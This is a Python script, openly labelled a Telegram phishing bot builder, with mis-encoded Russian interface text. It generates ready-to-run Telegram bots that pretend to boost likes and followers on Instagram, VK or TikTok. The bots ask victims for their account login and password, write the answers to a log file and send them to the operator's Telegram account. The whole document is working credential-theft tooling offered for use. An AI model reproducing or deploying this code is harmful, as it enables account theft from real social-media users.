#Developer: @lamer112311

import colorama
from colorama import Fore, Back, Style
import os
from sys import platform
import base64

def clear():
	if platform == "linux" or platform == "linux2":
		os.system("clear")
	elif platform == "win32":
		os.system('cls')
clear()
en = base64.b64decode('Q29kZWQgYnkgQGxhbWVyMTEyMzEx')
print(en.decode("UTF-8"))
print(Fore.GREEN + '''
         .e$$$$e.
       e$$$$$$$$$$e
      $$$$$$by$$$$$$
     d$$$$$$$$$$$$$$b
     $$lamer112311$$$
    4$$$$$$$$$$$$$$$$F
    4$$$$$$$$$$$$$$$$F
     $$$" "$$$$" "$$$
     $$F   4$$F   4$$
     '$F * 4$$F * 4$"
      $$   $$$$   $P
      4$$$$$"^$$$$$%
       $$$$F  4$$$$
        "$$$ee$$$"
        . *$$$$F4
         $     .$
         "$$$$$$"
          ^$$$$
 4$$c       ""       .$$r
 ^$$$b              e$$$"
 d$$$$$e          z$$$$$b
4$$$*$$$$$c    .$$$$$*$$$r
 ""    ^*$$$be$$$*"    ^"
          "$$$$"
        .d$$P$$$b
       d$$P   ^$$$b
   .ed$$$"      "$$$be.
 $$$$$$P          *$$$$$$
4$$$$$P            $$$$$$"
 "*$$$"            ^$$P
    ""              ^"
	''')
input(Fore.RED + "–ù–∞–∂–º–∏—Ç–µ Enter>>")
clear()

print(Fore.MAGENTA + '''
 _____ _____ _      _____
|_   _|  ___| |    |  ___
  | | | |__ | |    | |__ 
  | | |  __|| |    |  __|
  | | | |___| |____| |___
  \_/ \____/\_____/\____/ ''' + Fore.RED + '''
______ _   _ _____ _____ _   _ 
| ___ \ | | |_   _/  ___| | | |
| |_/ / |_| | | | \ `--.| |_| |
|  __/|  _  | | |  `--. \  _  |
| |   | | | |_| |_/\__/ / | | |
\_|   \_| |_/\___/\____/\_| |_/
	''')

print(Fore.GREEN + '#########################################')
print(Fore.GREEN + '+' + Fore.BLUE +  "     Telegram phishing bot builder     " + Fore.GREEN + '+')
print(Fore.GREEN + '+' + Fore.BLUE +  "       Developer: @rmkvlly         " + Fore.GREEN + '+')
print(Fore.GREEN + '#########################################')
userid = input(Fore.YELLOW +  "–í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–π Telegram ID > ")
token = input(Fore.BLUE +  "–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω –±–æ—Ç–∞ > ")
print(Fore.CYAN + '''
[1] Instagram
[2] VK
[3] Tiktok
	''')
choice = input(Fore.MAGENTA +  "–í—ã–±–µ—Ä–∏—Ç–µ –≤–∞—Ä–∏–∞–Ω—Ç —Ñ–∏—à–∏–Ω–≥–∞ –≤ –±–æ—Ç–µ>>> ")
if not choice.isdigit():
	print("–û—à–∏–±–∫–∞, –≤–∞—Ä–∏–∞–Ω—Ç –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–µ–ª—å–Ω—ã–º")
	exit(0)
choice = int(choice)





if choice == 1:
	f = open('Instagram.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import *
import time
import random
print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!")
log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
try:
	bot.send_message(ID, '!–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!') 
except:
	print("–í–æ–∑–º–æ–∂–Ω–æ –≤—ã –Ω–µ –Ω–∞–ø–∏—Å–∞–ª–∏ /start –≤ –≤–∞—à–µ–º –±–æ—Ç–µ! –ë–µ–∑ —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è —Å–∫—Ä–∏–ø—Ç –±—É–¥–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ!")


@bot.message_handler(commands=['start'])
def start(message):
	print(f'''–û–±–Ω–∞—Ä—É–∂–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!
ID: {{message.from_user.id}}''')
	bot.send_message(message.chat.id, '''üëã –ü—Ä–∏–≤–µ—Ç! üëã
		–≠—Ç–æ –±–æ—Ç –Ω–∞–∫—Ä—É—Ç–∫–∏ –ª–∞–π–∫–æ–≤ –∏ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ –Ω–∞ –≤–∞—à –∏–Ω—Å—Ç–∞–≥—Ä–∞–º –∞–∫–∫–∞—É–Ω—Ç!
		–ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å, –Ω–∞–∂–º–∏—Ç–µ /nacrutka''') 

@bot.message_handler(commands=['lamer112311dev'])
def lamer112311(message):
	bot.send_message(message.chat.id, '–ê–≤—Ç–æ—Ä —Å–∫—Ä–∏–ø—Ç–∞: @lamer112311. –ö–∞–Ω–∞–ª: @CyberPuffin') 

@bot.message_handler(commands=['nacrutka', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="–õ–∞–π–∫–∏‚ù§Ô∏è", callback_data="like")
	second_button = types.InlineKeyboardButton(text="–ü–æ–¥–ø–∏—Å—á–∏–∫–∏üìÉ", callback_data="sub")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ª–∞–π–∫–æ–≤ (–Ω–µ –±–æ–ª–µ–µ 500)') 
		bot.register_next_step_handler(msg, qproc1)

	elif call.data == "sub":
		msg = bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ (–Ω–µ –±–æ–ª–µ–µ 100)') 
		bot.register_next_step_handler(msg, qproc2)

def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /nacrutka!')#‚è≥
			return
		elif int(num) > 500:
			bot.reply_to(message, '–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ª–∞–π–∫–æ–≤ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500!')
			return
		else:
			bot.send_message(message.chat.id, f'–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ª–∞–π–∫–æ–≤: {{num}}')
			msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –ø–æ—á—Ç—É(–∏–ª–∏ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞) –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)


def qproc2(message):
	try:
		num = message.text
		if not num.isdigit():
			bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /nacrutka!')#‚è≥
			return
		elif int(num) > 100:
			bot.reply_to(message, '–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 100!')
			return
		else:
			bot.send_message(message.chat.id, f'–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤: {{num}}')
			msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –ø–æ—á—Ç—É(–∏–ª–∏ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞) –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)


def step1(message):
	get = f'''–ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: 
–ü–æ–ª—É—á–µ–Ω–æ –≤ –±–æ—Ç–µ: instagram
ID: {{message.from_user.id}}
–ù–∏–∫: @{{message.from_user.username}}
–õ–æ–≥–∏–Ω: {{message.text}}
–ò–º—è: {{message.from_user.first_name}}

'''
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	print(get)
	bot.send_message(ID, get)
	bot.reply_to(message, f'–í–∞—à –ª–æ–≥–∏–Ω: {{message.text}}')

	msg1 = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:') 
	bot.register_next_step_handler(msg1, step2)

	
def step2(message):
	usrpass = message.text
	get = f'''–ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: 
–ü–æ–ª—É—á–µ–Ω–æ –≤ –±–æ—Ç–µ: instagram
ID: {{message.from_user.id}}
–ù–∏–∫: @{{message.from_user.username}}
–ü–∞—Ä–æ–ª—å: {{usrpass}}
–ò–º—è: {{message.from_user.first_name}}

'''
	print(get)
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	bot.send_message(ID, get)
	msg = bot.reply_to(message, f'–í–∞—à –ø–∞—Ä–æ–ª—å: {{usrpass}}')
	time.sleep(1)
	bot.reply_to(message, f'–°–ø–∞—Å–∏–±–æ, —á—Ç–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏—Å—å –Ω–∞—à–∏–º —Å–µ—Ä–≤–∏—Å–æ–ºüòâ! –ï—Å–ª–∏ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ, –æ–∂–∏–¥–∞–π—Ç–µ –Ω–∞–∫—Ä—É—Ç–∫—É –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–∏ 24 —á–∞—Å–æ–≤!')


bot.polling()
		""")
	f.close()
	input("–§–∞–π–ª Instagram.py —Å–æ—Ö—Ä–∞–Ω–µ–Ω! –ù–∞–∂–º–∏—Ç–µ Enter")

if choice == 2:
	f = open('vk.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import *
import time

print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!")

log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
try:
	bot.send_message(ID, '!–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!') 
except:
	print("–í–æ–∑–º–æ–∂–Ω–æ –≤—ã –Ω–µ –Ω–∞–ø–∏—Å–∞–ª–∏ /start –≤ –≤–∞—à–µ–º –±–æ—Ç–µ! –ë–µ–∑ —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è —Å–∫—Ä–∏–ø—Ç –±—É–¥–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ!")



@bot.message_handler(commands=['start'])
def start(message):
	print(f'''–û–±–Ω–∞—Ä—É–∂–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!
	ID: {{message.from_user.id}}''')
	bot.send_message(message.chat.id, '''üëã –ü—Ä–∏–≤–µ—Ç! üëã
		–≠—Ç–æ –±–æ—Ç –Ω–∞–∫—Ä—É—Ç–∫–∏ –ª–∞–π–∫–æ–≤ –∏ –¥—Ä—É–∑–µ–π –Ω–∞ –≤–∞—à VK –∞–∫–∫–∞—É–Ω—Ç!
		–ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å, –Ω–∞–∂–º–∏—Ç–µ /nacrutka''') 

@bot.message_handler(commands=['lamer112311dev'])
def lamer112311(message):
	bot.send_message(message.chat.id, '–ê–≤—Ç–æ—Ä —Å–∫—Ä–∏–ø—Ç–∞: @lamer112311. –ö–∞–Ω–∞–ª: @CyberPuffin') 

@bot.message_handler(commands=['nacrutka', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="–õ–∞–π–∫–∏‚ù§Ô∏è", callback_data="like")
	second_button = types.InlineKeyboardButton(text="–î—Ä—É–∑—å—èüìÉ", callback_data="like")
	button3 = types.InlineKeyboardButton(text="–†–µ–ø–æ—Å—Ç—ã", callback_data="like")
	button4 = types.InlineKeyboardButton(text="–ü—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è –ø–ª–µ–π–ª–∏—Å—Ç–æ–≤", callback_data="like")
	keyboardmain.add(first_button, second_button, button3, button4)
	bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ (–Ω–µ –±–æ–ª–µ–µ 500)') 
		bot.register_next_step_handler(msg, qproc1)

def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /nacrutka!')#‚è≥
			return
		elif int(num) > 500:
			bot.reply_to(message, '–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500!')
			return
		else:
			bot.send_message(message.chat.id, f'–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ: {{num}}')
			msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)




def step1(message):
	inp = message.text.replace("+", "")
	if not inp.isdigit():
		bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /nacrutka!')#‚è≥
		return
	get = f'''–ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: 
–ü–æ–ª—É—á–µ–Ω–æ –≤ –±–æ—Ç–µ: vk
ID: {{message.from_user.id}}
–ù–∏–∫: @{{message.from_user.username}}
–õ–æ–≥–∏–Ω: {{message.text}}
–ò–º—è: {{message.from_user.first_name}}

'''
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	print(get)
	bot.send_message(ID, get)
	bot.reply_to(message, f'–í–∞—à –ª–æ–≥–∏–Ω: {{message.text}}')

	msg1 = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:') 
	bot.register_next_step_handler(msg1, step2)

	
def step2(message):
	usrpass = message.text
	get = f'''–ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:
–ü–æ–ª—É—á–µ–Ω–æ –≤ –±–æ—Ç–µ: vk 
ID: {{message.from_user.id}}
–ù–∏–∫: @{{message.from_user.username}}
–ü–∞—Ä–æ–ª—å: {{usrpass}}
–ò–º—è: {{message.from_user.first_name}}

'''
	print(get)
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	bot.send_message(ID, get)
	msg = bot.reply_to(message, f'–í–∞—à –ø–∞—Ä–æ–ª—å: {{usrpass}}')
	time.sleep(1)
	bot.reply_to(message, f'–°–ø–∞—Å–∏–±–æ, —á—Ç–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏—Å—å –Ω–∞—à–∏–º —Å–µ—Ä–≤–∏—Å–æ–ºüòâ! –ï—Å–ª–∏ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ, —Ç–æ –æ–∂–∏–¥–∞–π—Ç–µ –Ω–∞–∫—Ä—É—Ç–∫—É–Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–∏ 24 —á–∞—Å–æ–≤!')


bot.polling()
		""")
	f.close()
	input("–§–∞–π–ª vk.py —Å–æ—Ö—Ä–∞–Ω–µ–Ω! –ù–∞–∂–º–∏—Ç–µ Enter")

if choice == 3:
	f = open('tiktok.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import *
import time
print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!")
print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω –∏ –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!")
log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
try:
	bot.send_message(ID, '!–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!') 
except:
	print("–í–æ–∑–º–æ–∂–Ω–æ –≤—ã –Ω–µ –Ω–∞–ø–∏—Å–∞–ª–∏ /start –≤ –≤–∞—à–µ–º –±–æ—Ç–µ! –ë–µ–∑ —ç—Ç–æ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è —Å–∫—Ä–∏–ø—Ç –±—É–¥–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ!")

@bot.message_handler(commands=['start'])
def start(message):
	print(f'''–û–±–Ω–∞—Ä—É–∂–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!
ID: {{message.from_user.id}}''')
	bot.send_message(message.chat.id, '''üëã –ü—Ä–∏–≤–µ—Ç! üëã
		–≠—Ç–æ –±–æ—Ç –ø—Ä–æ–¥–≤–∏–∂–µ–Ω–∏—è –≤–∞—à–µ–≥–æ —Ç–∏–∫—Ç–æ–∫ –∞–∫–∫–∞—É–Ω—Ç–∞!
		–ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å, –Ω–∞–∂–º–∏—Ç–µ /nacrutka''') 

@bot.message_handler(commands=['lamer112311dev'])
def lamer112311(message):
	bot.send_message(message.chat.id, '–ê–≤—Ç–æ—Ä —Å–∫—Ä–∏–ø—Ç–∞: @lamer112311. –ö–∞–Ω–∞–ª: @Cyber_Puffin') 

@bot.message_handler(commands=['nacrutka', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="–õ–∞–π–∫–∏‚ù§Ô∏è", callback_data="like")
	second_button = types.InlineKeyboardButton(text="–ü–æ–¥–ø–∏—Å—á–∏–∫–∏üìÉ", callback_data="like")
	button3 = types.InlineKeyboardButton(text="–ü—Ä–æ—Å–º–æ—Ç—Ä—ã", callback_data="like")
	button4 = types.InlineKeyboardButton(text="–†–µ–ø–æ—Å—Ç—ã", callback_data="like")
	keyboardmain.add(first_button, second_button, button3, button4)
	bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ (–Ω–µ –±–æ–ª–µ–µ 500)') 
		bot.register_next_step_handler(msg, qproc1)

def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–ø—ã—Ç–∫—É, –Ω–∞–ø–∏—Å–∞–≤ /nacrutka!')#‚è≥
			return
		elif int(num) > 500:
			bot.reply_to(message, '–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500!')
			return
		else:
			bot.send_message(message.chat.id, f'–ö–æ–ª–ª–∏—á–µ—Å—Ç–≤–æ: {{num}}')
			msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞(–∏–ª–∏ –ø–æ—á—Ç—É) –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)




def step1(message):
	get = f'''–ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ: 
–ü–æ–ª—É—á–µ–Ω–æ –≤ –±–æ—Ç–µ: tiktok
ID: {{message.from_user.id}}
–ù–∏–∫: @{{message.from_user.username}}
–õ–æ–≥–∏–Ω: {{message.text}}
–ò–º—è: {{message.from_user.first_name}}

'''
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	print(get)
	bot.send_message(ID, get)
	bot.reply_to(message, f'–í–∞—à –ª–æ–≥–∏–Ω: {{message.text}}')

	msg1 = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:') 
	bot.register_next_step_handler(msg1, step2)

	
def step2(message):
	usrpass = message.text
	get = f'''–ü–æ–ª—É—á–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:
–ü–æ–ª—É—á–µ–Ω–æ –≤ –±–æ—Ç–µ: tiktok 
ID: {{message.from_user.id}}
–ù–∏–∫: @{{message.from_user.username}}
–ü–∞—Ä–æ–ª—å: {{usrpass}}
–ò–º—è: {{message.from_user.first_name}}

'''
	print(get)
	log = open('bot-log.txt', 'a+', encoding='utf-8')
	log.write(get + '  ')
	log.close()
	bot.send_message(ID, get)
	msg = bot.reply_to(message, f'–í–∞—à –ø–∞—Ä–æ–ª—å: {{usrpass}}')
	time.sleep(1)
	bot.reply_to(message, f'–°–ø–∞—Å–∏–±–æ, —á—Ç–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏—Å—å –Ω–∞—à–∏–º —Å–µ—Ä–≤–∏—Å–æ–ºüòâ! –ï—Å–ª–∏ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ, –æ–∂–∏–¥–∞–π—Ç–µ –Ω–∞–∫—Ä—É—Ç–∫—É –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–∏ 24 —á–∞—Å–æ–≤!')




bot.polling()
		""")
	f.close()
	input("–§–∞–π–ª tiktok.py —Å–æ—Ö—Ä–∞–Ω–µ–Ω! –ù–∞–∂–º–∏—Ç–µ Enter")
#Developer: @rmkvlly
